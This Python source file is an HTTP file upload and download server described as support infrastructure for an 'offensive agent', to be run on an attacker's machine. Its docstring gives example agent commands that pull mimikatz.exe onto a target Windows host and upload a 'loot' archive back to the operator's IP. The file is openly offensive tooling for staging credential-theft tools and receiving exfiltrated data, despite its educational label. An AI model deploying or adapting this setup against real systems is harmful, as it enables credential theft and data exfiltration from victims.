#!/usr/bin/env python3
"""
Simple HTTP Server with File Upload Support
============================================

This server is designed to work with the offensive-agent file transfer module.
Use this on your operator/attacker machine to receive files from the agent.

Usage:
    python3 upload_server.py [port]
    
Default port: 8080

Features:
- Receives file uploads via POST to /upload
- Serves files via GET (like python -m http.server)
- Shows upload progress and details
- Saves uploaded files to ./uploads/ directory

Example Workflow:
    
    # On operator machine
    python3 upload_server.py 8080
    
    # On target (via agent)
    > transfer download http://10.10.14.5:8080/mimikatz.exe C:\Temp\mimi.exe
    > transfer upload C:\loot.zip http://10.10.14.5:8080/upload

Author: Educational Security Research
License: MIT
"""

import os
import sys
from http.server import HTTPServer, SimpleHTTPRequestHandler
import cgi
from datetime import datetime

class UploadHTTPRequestHandler(SimpleHTTPRequestHandler):
    """HTTP Request Handler with upload support"""
    
    # Directory where uploaded files will be saved
    UPLOAD_DIR = "uploads"
    
    def __init__(self, *args, **kwargs):
        # Create upload directory if it doesn't exist
        os.makedirs(self.UPLOAD_DIR, exist_ok=True)
        super().__init__(*args, **kwargs)
    
    def do_POST(self):
        """Handle POST requests (file uploads)"""
        
        if self.path == '/upload':
            self.handle_upload()
        else:
            self.send_error(404, "Upload endpoint is /upload")
    
    def handle_upload(self):
        """Process file upload"""
        
        try:
            # Parse the form data
            content_type = self.headers['Content-Type']
            
            if not content_type:
                self.send_error(400, "No Content-Type header")
                return
            
            # Parse multipart form data
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={
                    'REQUEST_METHOD': 'POST',
                    'CONTENT_TYPE': content_type,
                }
            )
            
            # Get the uploaded file
            if 'file' not in form:
                self.send_error(400, "No file field in form data")
                return
            
            file_item = form['file']
            
            if not file_item.filename:
                self.send_error(400, "No filename provided")
                return
            
            # Generate safe filename
            filename = os.path.basename(file_item.filename)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_filename = f"{timestamp}_{filename}"
            filepath = os.path.join(self.UPLOAD_DIR, safe_filename)
            
            # Save the file
            file_size = 0
            with open(filepath, 'wb') as f:
                file_size = f.write(file_item.file.read())
            
            # Log the upload
            print(f"\n[+] File uploaded successfully!")
            print(f"    Original name: {filename}")
            print(f"    Saved as: {safe_filename}")
            print(f"    Size: {self.format_bytes(file_size)}")
            print(f"    Location: {filepath}")
            print(f"    From: {self.client_address[0]}:{self.client_address[1]}")
            
            # Send success response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            
            response = f"File uploaded successfully: {safe_filename} ({self.format_bytes(file_size)})"
            self.wfile.write(response.encode())
            
        except Exception as e:
            print(f"[!] Upload error: {e}")
            self.send_error(500, f"Upload failed: {str(e)}")
    
    def do_GET(self):
        """Handle GET requests (file downloads) - use default behavior"""
        
        # Log download requests
        if self.path != '/':
            print(f"[*] Download request: {self.path} from {self.client_address[0]}")
        
        # Use parent class method for file serving
        return super().do_GET()
    
    @staticmethod
    def format_bytes(bytes_size):
        """Convert bytes to human-readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if bytes_size < 1024.0:
                return f"{bytes_size:.1f} {unit}"
            bytes_size /= 1024.0
        return f"{bytes_size:.1f} PB"
    
    def log_message(self, format, *args):
        """Override to customize logging"""
        # Only log errors and important messages
        if "code 404" not in format % args:
            super().log_message(format, *args)


def run_server(port=8080):
    """Start the HTTP server"""
    
    server_address = ('', port)
    httpd = HTTPServer(server_address, UploadHTTPRequestHandler)
    
    print("=" * 60)
    print("  File Upload Server - Offensive Agent Support")
    print("=" * 60)
    print(f"\n[+] Server started on port {port}")
    print(f"[+] Upload endpoint: http://0.0.0.0:{port}/upload")
    print(f"[+] Download from: http://0.0.0.0:{port}/<filename>")
    print(f"[+] Uploaded files saved to: ./{UploadHTTPRequestHandler.UPLOAD_DIR}/")
    print("\n[*] Waiting for connections... (Ctrl+C to stop)\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] Server stopped by user")
        httpd.server_close()


if __name__ == '__main__':
    # Get port from command line or use default
    port = 8080
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print(f"Invalid port: {sys.argv[1]}")
            print("Usage: python3 upload_server.py [port]")
            sys.exit(1)
    
    run_server(port)